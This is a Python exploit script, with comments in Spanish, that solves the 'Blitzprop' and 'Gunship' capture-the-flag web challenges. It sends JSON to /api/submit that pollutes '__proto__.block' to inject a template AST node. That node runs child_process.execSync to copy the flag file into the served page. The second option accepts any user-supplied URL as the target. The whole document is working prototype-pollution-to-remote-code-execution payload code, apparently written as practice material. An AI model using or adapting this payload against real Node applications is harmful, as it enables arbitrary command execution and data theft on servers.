import requests

TARGET_URL = 'http://localhost:1337'

print("1) Blitzprop")
print("2) Gunship")

op1=input("Seleccione el reto a resolver: ")
#Se ingresa el número del reto a resolver, 1 o 2

if(op1=="1"):
    #Si el número seleccionado es 1 se hace el request con la inyección AST a localhost en el puerto 1337
    requests.post(TARGET_URL + '/api/submit', json = {
        "song.name" : "ASTa la vista baby",
        "__proto__.block": {
            "type": "Text",
            "line": "process.mainModule.require('child_process').execSync(`cat flag* > views/index.html`).toString()"
        }
    })
    requests.get(TARGET_URL)
    print("Se ha realizado el request")
    #Una vez hecha la solicitud solo falta recargar la página en el navegador y aparecerá la bandera
        
elif(op1=="2"):
    #Si el número seleccionado es 2 se debe de pedir la URL a la que se hará el request, ya que en este caso si cambia.
    #EL URL debe incluir el http:// ip : puerto
    op2=input("Ingrese la dirección ip, incluyendo el http: ")
    print(op2)
    requests.post(op2 + '/api/submit', json = {
        "artist.name" : "Alex Westaway",
        "__proto__.block": {
            "type": "Text",
            "line": "process.mainModule.require('child_process').execSync(`cat flag* > views/index.html`).toString()"
        }
    })

    requests.get(op2)
    print("Se ha realizado el request")
    #Una vez hecha la solicitud solo falta recargar la página en el navegador y aparecerá la bandera
